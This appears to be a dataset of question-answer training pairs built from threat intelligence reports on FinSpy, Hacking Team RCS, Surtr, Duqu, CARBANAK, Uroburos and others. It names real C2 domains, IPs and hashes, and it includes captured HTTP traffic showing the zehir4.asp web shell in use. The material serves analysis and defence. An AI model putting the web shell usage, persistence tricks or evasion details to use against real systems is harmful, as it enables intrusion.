    "instruction": "Small Headline: 5.1 FinSpy\nIdentifying and linking servers: We developed a number of fingerprints for identifying FinSpy servers using HTTP-based probing as well as FinSpy's custom TLV-based protocol. We leveraged quirks such as specific non-compliance with RFC 2616, responses to certain types of invalid data, and the presence of signatures such as the bizarre \"Hallo Steffi\" that Guarnieri identified from Bahraini FinSpy C&C servers [67, 68]. See Appendix A for details. We then exhaustively scanned the Internet looking for matches to these fingerprints.\nGamma documentation advertises that an operator of FinSpy can obscure the location of the C&C server (called the master) by setting up a proxy known as a relay. In Spring 2013 we noticed FinSpy servers now issuing 302 Redirects to google.com. However, we noticed anomalies: for example, servers in India were redirecting to the Latvian version of Google google.lv. We suspect that the server in India was a relay forwarding to a master in Latvia. Because the master served as a proxy for Google, we could uncover its IP address using a Google feature that prints a user's IP address for the query \"IP address.\" We created an additional fingerprint based on the proxying behavior and issued GET /search?q=ip+address&nord=1 requests to servers We note some interesting master locations in Table 4.\nServer locations: In all, our fingerprints matched 92 distinct IP addresses in 35 different countries. Probing these on 8/8/13 revealed 22 distinct addresses still responding, sited in: Bahrain, Bangladesh, Bosnia and Herzegovina, Estonia, Ethiopia, Germany, Hong Kong, Indonesia, Macedonia, Mexico, Romania, Serbia, Turkmenistan, and the United States. We found servers responding to a number of our fingerprints, suggesting either that some servers lag in their updates, or a concerted effort to vary the behavior of FinSpy servers to make detection harder.\nWe found: (1) 3 IP addresses in ranges registered to Gamma. (2) Servers in 3 IP ranges explicitly registered to government agencies: Turkmenistan's Ministry of Communications, Qatar's State Security Bureau, and the Bulgarian Council of Ministers. (3) 3 additional IP addresses in Bahrain, all in Batelco. (4) Servers in 7 countries with governments classified as \"authoritarian regimes\" by The Economist [69]: Bahrain, Ethiopia, Nigeria, Qatar, Turkmenistan, UAE, Vietnam.\nAdditional FinSpy samples: In parallel to our scanning, we obtained 9 samples of FinSpy by writing YARA [70] rules for the \"malware hunting\" feature of VirusTotal Intelligence. This feature sends us all newly-submitted samples that match our signatures. We located a version of FinSpy that does not use the normal FinSpy handshake, but instead uses a protocol based on HTTP POST requests for communication with the C&C server. This did not appear to be an older or newer ver-\nsion of the protocol, suggesting that our scan results may not reveal the full scope of FinSpy C&C servers. Perhaps, the HTTP POST protocol was only delivered to a specific Gamma customer to meet a requirement.\nSmall Headline: 5.2 Remote Control System (RCS)\nWe began by analyzing the UAE RCS sample from Ahmed and 6 samples obtained from VirusTotal by searching for AV results containing the strings \"DaVinci\" and \"RCS.\" At the time, several AV vendors had added detection for RCS based on a sample analyzed by Dr. Web [71] and the UAE RCS sample sent to Ahmed. We also similarly obtained and analyzed samples of FSBSpy [72], a piece of malware that can report system information, upload screenshots, and drop and execute more malware, Based on these samples, we devised YARA signatures that yielded 23 additional samples of structurally similar malware.\nFingerprints: We probed the C&C servers of the RCS and FSBSpy samples, and found that they responded in a distinctive way to HTTP requests, and returned distinctive SSL certificates.\nWe searched sources including Shodan, 5 Internet Census service probes [73], and Critical.IO scanning data [68] for the observed distinctive HTTP behavior. We searched for the distinctive SSL certificates in two Internet Census service probes, and SSL certificate scans from ZMap [74]. We also contacted a team at TU Munich [75], who applied our fingerprints to their SSL scanning data. Across all of these sources, we obtained 31,345 indicator hits reflecting 555 IP addresses in 48 countries.\nOne SSL certificate returned by 175 of the servers was issued by \"/CN=RCS Certification Authority /O=HT srl,\" apparently referring to the name of the spyware and the company. Servers for 5 of our FSBSpy samples and 2 of our RCS samples responded with this type of certificate.\nSome servers returned these certificates in chains that included another distinctive certificate. We found 175 distinct IP addresses (including the C&C's for 5 of our FSBSpy samples and 2 of our RCS samples) responded with this second type of certificate.\nWe devised two more indicators: one that matched 125 IP addresses, including 7 of our FSBSpy samples' C&C's, and one that matched 2 IP addresses, in Italy and Kazakhstan.\nServer locations: On 11/4/13 we probed all of the IP addresses that we collected, finding 166 active addresses match-\ning one of our fingerprints in 29 different countries. We summarize the top providers and countries in Table 5.\nThe prevalence of active servers either located in the USA or hosted by Linode is striking,8 and seems to indicate a pervasive use of out-of-country web hosting and VPS services. In addition, we found: (1) 3 IP addresses on a /28 named \"HT public subnet\" that is registered to the CFO of Hacking Team [76]. The domain hackingteam.it resolves to an address in this range. (2) An address belonging to Omantel, a majority-state-owned telecom in Oman. This address was unreachable when we probed it; a researcher pointed us to an FS-BSpy sample that contained an Arabic-language bait document about Omani poetry, which talked to a C&C in the UK. (3) 7 IP addresses belonging to Maroc Telecom. Moroccan journalists at Mamfakinch.com were previously targeted by RCS in 2012 [77]. (4) Overall, servers in 8 countries with governments deemed \"authoritarian regimes\" [69]: Azerbaijan, Kazakhstan, Nigeria, Oman, Saudi Arabia, Sudan, UAE, Uzbekistan. Link to Hacking Team: All active servers matching one of our signatures also responded peculiarly when queried with particular ill-formed HTTP requests, responding with \"HTTP1/1 400 Bad request\" (should be \"HTTP/1.1\") and a body of \"Detected error: HTTP code 400\". Googling for this response yielded a GitHub project em-http-server [78], a Ruby-based webserver. The project's author is listed as Alberto Ornaghi, a software architect at Hacking Team. We suspect that the Hacking Team C&C server code may incorporate code from this project.\nLinks between servers: We identified many cases where several servers hosted by different providers, and in different countries, returned identical SSL certificates matching our fingerprints. We also observed 30 active servers used a global IPID. Only one active server had neither a global IPID nor\nan SSL certificate matching our fingerprints. We assessed whether servers returning SSL certificates were forwarding to the servers with global IPIDs by inducing bursts of traffic at the former and monitoring the IPID at the latter. For 11 servers, we found that the server's activity correlated to bursts sent to other servers We grouped servers by the SSL certificates they returned, and found that each group forwarded to only a single server, except for one case where a group forwarded to two different IPs (both in Morocco). We also found two groups that forwarded to the same address. There was a 1:1 mapping between the remaining 8 addresses and groups. We refer to a group along with the server(s) it forwards to as a server group. We identified several server groups that may be associated with victims or operators in a certain country. Some of these suggest possible further investigation:\n819 of the 42 Linode servers were hosted in the USA, so the two patterns of prevalence are mostly distinct.\nTurkey: We identified a group containing 20 servers in 9 countries. Two RCS and 5 FSBSpy samples from VirusTo-tal communicated with various servers in the group. The RCS samples also communicated with domains with lapsed registrations, so we registered them to observe incoming traffic. We exclusively received RCS traffic from Turkish IP addresses. (RCS traffic is identifiable based on a distinctive user agent and URL in POST requests.) A sample of FSBSpy apparently installed from an exploit on a Turkish server talked to one of the servers in this group.[79]\nWe also found server groups containing servers in Uzbekistan and Kazakhstan; we found FSBSpy samples on Virus-Total uploaded from these countries that communicated with servers in these groups.\nIn the above cases, save Turkey, the country we have identified is classified as an \"authoritarian regime,\" and may be using Hacking Team products against the types of targets we profile in this paper. In the case of Turkey, there are hints that the tool may be employed against dissidents [80].\nQuestion: What methods did the researchers use to identify and analyze Remote Control System (RCS) servers, and what were the notable findings from this analysis?",
    "output": "Answer: The researchers began by analyzing the UAE RCS sample from Ahmed and samples obtained from VirusTotal by searching for AV results containing the strings 'DaVinci' and 'RCS.' They devised YARA signatures that yielded additional samples of structurally similar malware. They probed the C&C servers of the RCS and FSBSpy samples and found distinctive HTTP behaviors and SSL certificates. Notable findings included servers in the USA and hosted by Linode, servers registered to Hacking Team, and servers in countries with authoritarian regimes, indicating a pervasive use of out-of-country web hosting and VPS services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Initial Discovery and Delivery\nThis investigation began when we identified two malicious Word document files in AutoFocus threat intelligence tool. While we cannot be certain how the documents were sent to the targets, phishing emails are highly likely. One of the malicious files was submitted to VirusTotal on 6 March 2017 with the file name \"\ud55c\uc2f9\uc2dc\uc2a4\ud15c.doc\". Once opened, both files display the same Korean language decoy document which appears to be the benign file located online at \"www.kuipernet.co.kr/sub/kuipernet-setup.docx\".\n\nQ: How did the initial discovery of the Lazarus group's malicious activity begin, and what methods were likely used to deliver the malware? Additionally, describe the nature of the decoy document used in this attack.",
    "output": "A: The initial discovery of the Lazarus group's malicious activity began when two malicious Word document files were identified using the AutoFocus threat intelligence tool. Although the exact delivery method is uncertain, it is highly likely that phishing emails were used. One of the malicious files was submitted to VirusTotal on 6 March 2017 with the file name '\ud55c\uc2f9\uc2dc\uc2a4\ud15c.doc'. Upon opening, both files displayed the same Korean language decoy document, which appeared to be a benign file located online at 'www.kuipernet.co.kr/sub/kuipernet-setup.docx'.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Delivery Mechanism\nWhile the malicious attachments appear to be DOC files due to their file extension, they are actually RTFs crafted to exploit a vulnerability in Microsoft Word: CVE-2012-0158.\nThis particular vulnerability was first exploited in early April 2012 and a patch was released by Microsoft on April 10, 2012. Currently, the sample is detected as malicious by 34 percent of antivirus (AV) engines on VirusTotal (VT).\nThe malicious attachment is created using a shared template that we have seen used against multiple Tibetan groups. This template was created in March 2013 and, instead of specifically using the vulnerable ActiveX controls described in the vulnerability description, it utilizes the Chartspace Office Web Component. This component either suffers from the same vulnerability or uses one of the named ActiveX controls resulting in the attacker being able to execute malicious code.\nFigure 1: Hexdump of the malicious attachment\nAlthough CVE-2012-0158 was first published and used in the wild in April 2012, samples using this template were only initially detected by three AV engines (on VT). Therefore, while a third of AV engines had a detection signature for CVE-2012-0158 as late as April 2013, it was possible to design a document using a year old vulnerability that was recognized as malicious by very few AV products. This number has since risen and it is currently being detected by 34 percent of the AV products listed on VT.\nThis vulnerability highlights the need to keep both operating systems and applications up to date as well as to exercise vigilance concerning links and email attachments.\nMalicious attachments with this template all use a similar dropper which originally drops the payload to the temporary file directory.\nBig Headline: Payload\nSurtr creates either a new explorer or iexplore process and injects itself into this new process using CreateRemoteThread function.\nIt also creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/123\n%ALL USERS%/Application Data/Microsoft/Windows/Burn\n%ALL USERS%/Application Data/Microsoft/Windows/LiveUpdata_Mem\nIt creates multiple copies of the payload including in both the Burn and LiveUpdata_Mem folders. The copy in the Burn folder is called [VICTIM COMPUTER NAME].dll and there are three copies in the LiveUpdata_Mem folder whose names consist of 6 random alphanumeric characters which are then appended with .dll, _Fra.dll and _One.dll. These copies will differ from the original payload dropped in the %TEMP% folder by filling the resource section with varying amounts of 00 bytes. This also results in the malware having a much larger file size (30-50mb) possibly in an attempt to evade antivirus heuristics.\nSurtr connects to a command and control server (C2) and downloads a stage two component to %ALL USERS%/Application Data/Microsoft/Windows/Burn/_[VICTIM COMPUTER NAME].log. This particular sample connects to internet.3-a.net on port 9696.\nIn May 2012, internet.3-a.net resolved to the same IP (184.82.123.143) as android.uyghur.dnsd.me, which is a C2 used in Android malware attacks that targeted the Tibetan community as previously documented by the Citizen Lab.\nThe stage two component that was downloaded in this particular case has an internal name of x86_GmRemote.dll, however we have seen an alternate stage two used with the name Remote.dll as well. Our analysis in this post focuses on the GmRemote variation as it has been seen in multiple attacks.\nSurtr's capabilities include listing of file directories and contents on the victim computer and any USB drives connected to a victim machine, viewing web cache, executing remote commands and logging keystrokes.\nIn order to store temporary information, Surtr creates the following folders:\n%ALL USERS%/Application Data/Microsoft/Windows/MpCache\n%ALL USERS%/Application Data/Microsoft/Windows/nView_DiskLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_KeyLoydb\n%ALL USERS%/Application Data/Microsoft/Windows/nView_skins\n%ALL USERS%/Application Data/Microsoft/Windows/UsbLoydb\nFor example, in nView_DiskLoydb, a file called FileList.db that contains file and directory listings will be placed and nView_KeyLoydb will contain text files with keylogger output. The keylogger output is disguised by adding a constant to the ordinal value of the character.\nThis data can then be sent to the C2. It is compressed using zlib DEFLATE so the network traffic is not human readable without decompression.\nIt can also download additional malware onto the victim computer, which can provide attackers with further abilities like accessing the victim computer's webcam or microphone. In particular, we have seen Surtr used in conjunction with the Gh0st RAT derived LURK0 malware.\nFor persistency, Surtr adds a key to the registry to ensure it runs when the infected computer is restarted. It also stores its C2 information and a campaign code in the registry.\nDepending on the configuration, Surtr will either create multiple registry keys in Software\\Microsoft\\Windows Media in HKU (hkey users) with text data or a single key called XC consisting of binary data. These are usually xor encrypted with a key of 0\u00d71.\nFigure 2: Encrypted data in XC key\nBig Headline: Other Samples & Variations\nWe have seen a large number of similar samples sent to Tibetan groups that use the same stage two (GmRemote) and communicate with the following C2s: dtl.dnsd.me, dtl.eatuo.com, dtl6.mooo.com and tbwm.wlyf.org. These C2s were also used in previous attacks documented in an earlier Citizen Lab post on LURK0 malware targeting the Tibetan community.\nOne particular sample (md5: ad9e5f79585eb62bc40b737e98bfd62e) which connects to C2 domain dtl6.mooo.com (which resolved to the same IP as the other dtl domains mentioned above) on port 6178 was seen to download LURK0 malware after the initial Surtr infection. This LURK0 sample had the campaign code ZQ6 that connects to C2 domain tbwm.wlyf.org on port 3103. This domain also resolved to the same IP as the dtl domains.\nWe have also found reports of other Surtr stage 2 (GmRemote) samples that have campaign codes which suggest they may be targeted at commercial and government targets.\nThe first sample was found via ThreatExpert. It uses campaign code kmlg-0308, and connects to a C2 at flyoutside.com. This domain and eight others are registered to toucan6712@163.com:\nSearching for more samples in Virus Total Intelligence (VTI) using domains and other identifying features reveals four related files:\n7fbdd7cb8b46291e944fcecd5f97d135 \u2013 connects to C2 domain www.flyoutside.com, campaign code kmlg-0409tb\n58ff38412ebbedb611a3afe4b3dbd8b0 \u2013 connects to C2 IP 112.121.182.149 (similar to above), campaign code lly-0311\n81bc8974967e1c911b107a9a91e3178b \u2013 connects to C2 domain www.paulfrank166.2waky.com (192.198.85.102), campaign code 0201-2116\n44758b9a7a6cafd1b8d1bd4c773a2577 \u2013 connects to C2 domain www.flyoutside.com (same as the first sample found on ThreatExpert), campaign code lg-0109\nMost of these samples have campaign codes that suggest commercial targets. However, we do not have information about where these samples were submitted from, so the target sector and victims cannot be confirmed.\nA second GmRemote sample was found via the web, called Trojan/Subxe.89E1 by Anchiva. This sample connects to google.djkcc.com and uses campaign code in1102. Other subdomains under djkcc.com include:\nairforce.djkcc.com\ndomain.djkcc.com\ngoogle.djkcc.com\nindianembassy.djkcc.com\nmailnic.djkcc.com (MailNIC is an Indian email site at the National Informatics Centre)\nmicrosoft.djkcc.com\nrediffmail.djkcc.com (Rediffmail is an Indian email site)\nWhile we do not have information about what victims these samples target, the campaign code, C2 domain, and related subdomains give some possible indications.\nOne additional find via VTI is a GmRemote sample internally named: GmKeyBoradServer_DLL.dll (MD5 e7e1c69496ad7cf093945d3380a2c6f4).\nIt exports functions (GmFunctionType, GmInitPoint, GmMyInitPoint, GmRecvPoint, GmShutPoint, GmVerSion) that are referenced in other GmRemote samples, although none of them have any real content.\nThese additional samples suggest that Surtr is being used to target groups beyond the Tibetan community and is possibly being utilized by multiple threat actors.\nRead the text above and answer this question: How does the Surtr malware exploit the CVE-2012-0158 vulnerability in Microsoft Word, and why might this approach be effective even though the vulnerability was patched over a year before the attack?",
    "output": "The Surtr malware exploits the CVE-2012-0158 vulnerability by utilizing a shared template that employs the Chartspace Office Web Component, which either suffers from the same vulnerability or uses one of the named ActiveX controls, allowing the attacker to execute malicious code. This approach is effective because, despite the vulnerability being patched in April 2012, the specific template used in the attack was only initially detected by three antivirus engines on VirusTotal. This highlights that even year-old vulnerabilities can be exploited if the attack is designed in a way that evades most antivirus detections.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key indicators of a Duqu infection, and how can administrators monitor for these indicators within their network?",
    "output": "The Duqu trojan attempts to use the network to communicate with a remote command and control (C2) server to receive instructions and to exfiltrate data. Analysis of Duqu revealed that it uses the 206.183.111.97 IP address as its C2 server. This IP address is located in India and has been shut down by the hosting provider. Also, Duqu may attempt to resolve the kasperskychk.dyndns.org domain name. The resulting IP address is not used for communications, so this lookup may serve as a simple Internet connectivity check. Administrators should monitor their network for systems attempting to resolve this domain or connect to the C2 IP address for possible infection. Duqu uses multiple protocols to communicate with its C2 server, including standard HTTP on TCP port 80 and a custom protocol on TCP port 443. Some of Duqu's communications that use TCP port 443 do not use the HTTPS protocol. Organizations may be able to monitor egress traffic through proxy servers or web gateways and investigate network traffic that does not conform to the SSL (Secure Sockets Layer) specification. Non-SSL traffic on port 443 is commonly observed with other threats, and this behavior is not exclusive to Duqu. The name 'Duqu' was assigned to this malware because the keylogger program creates temporary files that begin with the prefix '~DQ'. A computer infected with Duqu may have files beginning with '~DQ' in Windows temporary directories.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the attackers in the RSA Russian-Bank-Offices-Phishing-Wave APT report use Phishing: Spearphishing Attachment to target Russian banks?",
    "output": "Phishing: Spearphishing Attachment is a type of social engineering attack where adversaries send spearphishing emails with a malicious attachment to gain access to victim systems. In the case of the RSA Russian-Bank-Offices-Phishing-Wave APT report, the attackers used this technique to target Russian banks by sending emails with malicious attachments, specifically Microsoft Office documents (.docx files), that exploited a vulnerability in Microsoft's Encapsulated Postscript (EPS) filter. The attackers posed as disgruntled banking customers and used social engineering tactics to trick the recipients into opening the attachments, which would then execute the payload and potentially give the attackers access to the victim's system. Interestingly, the attackers reused and modified existing EPS exploit code, which suggests that they may have been trying to introduce uncertainty and misattribution or send a message to defenders or researchers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What types of tools did the CARBANAK attackers use in their toolset, and how did they manage to evade detection by antivirus vendors?",
    "output": "The CARBANAK attackers used a mix of custom tools, freely available code, and open source software utilities in their toolset. RSA IR researched all 32 of the malicious files in the CARBANAK toolset using various publicly available and open source resources. Six of these tools were found to have been uploaded to a publicly available antivirus aggregation site, with five of them having little to no detection or indication of malice from antivirus vendors. This lack of detection explains why the client's signature-based host protection mechanisms were unable to identify or prevent the use of these tools.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the key limitations that hinder North Korea's ability to expand its cyber warfare capabilities using its own infrastructure?",
    "output": "North Korea faces several key limitations that hinder its ability to expand its cyber warfare capabilities using its own infrastructure. Firstly, the regime has unstable power supplies, which restrict the scalability of its Computer Network Operations (CNO) capabilities. Secondly, North Korea suffers from monetary deficiencies, limiting its capacity to invest in and expand its infrastructure and CNO capabilities without third-party aid. Additionally, sanctions and export laws prohibit the sale of certain technologies to North Korea, forcing the regime to either develop its own technology, engage in industrial espionage, or rely on third parties to procure necessary equipment. Given these constraints, North Korea's reliance on external support, particularly from China, is crucial for sustaining its cyber warfare program.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Introduction\nMaudi is a series of small malwares that share similar configuration and behaviour. The naming of this family has not been very established, but some samples are detected by some vendors as Maudi or PoisonIvy. This is partly accurate as Maudi trojans in almost all cases install the well known PoisonIvy remote access trojan.\nThese malwares are not particularly new - they have been in circulation for a long time, probably going back to at least 2009. Still, they provide a backdrop to other attacks that is interesting.\n\nBased on the above text, answer a question. Why does the NormanShark-MaudiOperation APT utilize the Maudi trojan, and how does its relationship with the PoisonIvy remote access trojan contribute to the effectiveness of these attacks?",
    "output": "The NormanShark-MaudiOperation APT utilizes the Maudi trojan because it serves as a delivery mechanism for the well-known PoisonIvy remote access trojan. By installing PoisonIvy, the Maudi trojan provides attackers with a robust and established means of gaining remote access to compromised systems. This relationship enhances the effectiveness of the attacks by leveraging the capabilities of PoisonIvy, which has been in circulation since at least 2009, indicating its proven reliability and longevity in the threat landscape.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: What is Uroburos?\nUroburos is a rootkit, composed of two files, a driver and an encrypted virtual file system. The rootkit is able to take control of an infected machine, execute arbitrary commands and hide system activities. It can steal information (most notably: files) and it is also able to capture network traffic. Its modular structure allows extending it with new features easily, which makes it not only highly sophisticated but also highly flexible and dangerous. Uroburos' driver part is extremely complex and is designed to be very discrete and very difficult to identify.\n\nHow does the modular structure of the Uroburos rootkit contribute to its sophistication and flexibility, and what implications does this have for cybersecurity professionals?",
    "output": "A: The modular structure of the Uroburos rootkit allows it to be extended with new features easily. This modularity contributes to its sophistication by enabling the addition of various functionalities without altering the core components. The flexibility it offers means that attackers can adapt the rootkit to different environments and objectives, making it a versatile tool for cyber espionage and data theft. For cybersecurity professionals, this implies that they need to be vigilant and proactive in monitoring for new variants and capabilities of the rootkit. They must also develop strategies to detect and mitigate not just the known functionalities but also potential future enhancements.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: ASP Shell Backdoor: ZEHIR4.ASP\n- Backdoor script first accessed\nGET /zehir4.asp HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;\n.NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 04:56:13 GMT\nX-Powered-By: ASP.NET\nContent-Length: 11480\nContent-Type: text/html\nSet-Cookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF; path=/\nCache-control: private\nzehir3 --> powered by zehir <zehirhacker@hotmail.com\n<title>&gt;</title>\n<center>\n<a href=\"zehir4.asp?mevla=1&status=13\" onclick=\"sistemBilgisi(this.href);return false;\">System Info</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=40\" onclick=\"sistemTest(this.href);return false;\">System Test</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=50&path=c:\\inetpub\\wwwroot\\\" onclick=\"SitelerTestte(this.href);return false;\">Sites Test</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=14&path=c:\\inetpub\\wwwroot\\\"\nklasorIslemleri\nFolder Action\nonclick=\"(this.href);return false;\"></a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=15\" onclick=\"sqlServer(this.href);return false;\">SQL Server</a>\n<font color=yellow> | </font>\n<a href=\"zehir4.asp?mevla=1&status=33\" onclick=\"poweredby(this.href);return\nfalse;\">POWERED BY</a>\n<script language=javascript>\nfunction sistemBilgisi(yol){ NewWindow(yol,\"\",600,240,\"no\");\n---------------------------------------- TRUNCATED BY ANALYST --------------------------------------------------\n- System Info\nGET /zehir4.asp?mevla=1&status=13 HTTP/1.1\nAccept: */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 05:07:29 GMT\nX-Powered-By: ASP.NET\nContent-Length: 1663\nContent-Type: text/html\nCache-control: private\n<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title><table width=100% cellpadding=0 cellspacing=0><tr><td colspan=2 align=center><font color=yellow face='courier new'><b><font style='FONT-WEIGHT:normal' color=red face=wingdings>:</font> Sistem Bilgileri <font color=red face=wingdings style='FONT-\nWEIGHT:normal'>:</font></td></tr><tr><td><b><font color=red>Local Adres</td><td> 192.168.1.100</td></tr><tr><td><b><font color=red>User Agent</td><td> Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)</td></tr><tr><td><b><font color=red>Server</td><td>\n192.168.1.1</td></tr><tr><td><b><font color=red>IP</td><td>\n192.168.1.1</td></tr><tr><td><b><font color=red>HTTPD</td><td> MicrosoftIIS/5.1</td></tr><tr><td><b><font color=red>Port</td><td> 80</td></tr><tr><td><b><font color=red>Yol</td><td> c:\\inetpub\\wwwroot\\</td></tr><tr><td><b><font color=red>Log Root</td><td> /LM/W3SVC/1/ROOT</td></tr><tr><td><b><font color=red>HTTPS</td><td> off</td></tr></table>\n<script language=javascript> function NewWindow(mypage, myname, w, h, scroll) { var winl = (screen.width - w) / 2; var wint = (screen.height - h) / 2; winprops =\n'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable' win = window.open(mypage, myname, winprops)\nif (parseInt(navigator.appVersion) >= 4) { win.window.focus(); } } function ffd(yol){\nNewWindow(yol,\"\",420,100,\"no\");\n}\n</script>\n<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse> </tr></table>\n- System Test\nGET /zehir4.asp?mevla=1&status=40\nHTTP/1.1\nAccept: */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET\nCLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF\n---- RESPONSE ----\nSmall Headline: HTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 05:11:56 GMT\nX-Powered-By: ASP.NET\nContent-Length: 1284\nContent-Type: text/html\nCache-control: private\n<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title><table width='100%' align=center cellpadding=0 cellspacing=0 border=1><tr bgcolor=#ffffc0><td width='30%' align=center><font color=navy><b>Konum</td><td width='70%' align=center><font color=navy><b>Sonu.</td></tr><tr><td><b>C:\\</td><td><font color=red>yazma yetkisi yok! : [Object required]</td></tr><tr><td><b>Local Path </td><td><font color=red>yazma yetkisi yok! : [Object required]</td></tr><tr><td><b>Local Path <br>Parent Folder</td><td><font color=yellow>Folder : 5<br>File : 0</td></tr><tr><td><b>Local Path <br>P.Parent Folder</td><td><font color=yellow>Folder : 11<br>File : 10</td></tr></table> <script language=javascript> function NewWindow(mypage, myname, w, h, scroll) { var winl = (screen.width - w) / 2; var wint = (screen.height - h) / 2; winprops =\n'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable' win = window.open(mypage, myname, winprops) if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }\n} function ffd(yol){\nNewWindow(yol,\"\",420,100,\"no\");\n} </script>\n<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse> </tr></table>\n- SQL Server\nGET /zehir4.asp?mevla=1&status=15\nHTTP/1.1\nAccept: */*\nAccept-Language: en-us\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C)\nHost: 192.168.1.1\nConnection: Keep-Alive\nCookie: ASPSESSIONIDSSCDSDDD=JIKFODEDDBNCNBBCNLEIDBNF\n---- RESPONSE ----\nHTTP/1.1 200 OK\nServer: Microsoft-IIS/5.1\nDate: Sun, 23 Feb 2014 05:18:07 GMT\nX-Powered-By: ASP.NET\nContent-Length: 1169\nContent-Type: text/html\nCache-control: private\n<title>zehir3 --> powered by zehir &lt;zehirhacker@hotmail.com&gt;</title><form method=get action='' target='_opener' id=form1 name=form1><table cellpadding=0 cellspacing=0 align=center><tr><td align=center><font size=2>SQL Server i.in connection string giriniz</td></tr><tr><td align=center><input type=hidden value='7' name=status><input type=hidden value='12:18:07 AM' name=Time><input style='width:250; height:21' value='' name=path><br><input type=submit value='SQL Servera Ba.lan' style='height:23;width:170' id=submit1 name=submit1></td></tr></table></form>\n<script language=javascript> function NewWindow(mypage, myname, w, h, scroll) { var winl = (screen.width - w) / 2; var wint = (screen.height - h) / 2; winprops =\n'height='+h+',width='+w+',top='+wint+',left='+winl+',scrollbars='+scroll+',resizable' win = window.open(mypage, myname, winprops) if (parseInt(navigator.appVersion) >= 4) { win.window.focus(); }\n} function ffd(yol){\nNewWindow(yol,\"\",420,100,\"no\");\n}\n</script>\n<body bgcolor=black text=Chartreuse link=Chartreuse alink=Chartreuse vlink=Chartreuse> </tr></table>\nNetwork traffic observed when the following fake connection string is written in the box and the button is pressed: \"Server=myServerName\\myInstanceName;Database=myDataBase;User\nId=myUsername;\nPassword=myPassword;\"\n\nHow does the 'zehir4.asp' ASP Shell backdoor facilitate file and folder manipulation, and what specific actions can an attacker perform using these capabilities?",
    "output": "A: The 'zehir4.asp' ASP Shell backdoor facilitates file and folder manipulation through various options available in the backdoor interface. For example, the 'Folder Action' option allows the attacker to perform actions such as deleting, copying, and moving folders. Additionally, the attacker can browse directories, upload, download, copy, delete, modify, and search for files. These capabilities are accessed through different links in the backdoor interface, each corresponding to specific actions. This level of control enables the attacker to manipulate the file system of the compromised server extensively.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
